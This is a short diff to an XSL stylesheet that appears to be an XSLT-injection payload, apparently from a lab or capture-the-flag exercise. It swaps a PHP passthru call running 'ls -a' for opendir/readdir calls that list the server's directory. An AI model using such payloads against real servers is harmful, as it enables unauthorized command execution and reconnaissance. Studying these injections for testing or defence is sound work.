@@ -7,7 +7,8 @@
 			<h3>BRUH</h3>
 			<ul>
 				<li>
-					<xsl:value-of select="php:function('passthru','ls -a')"/>
+					<xsl:value-of select="php:function('opendir','.')"/>
+					<xsl:value-of select="php:function('readdir')"/>
 				</li>
 			</ul>
 		</body>
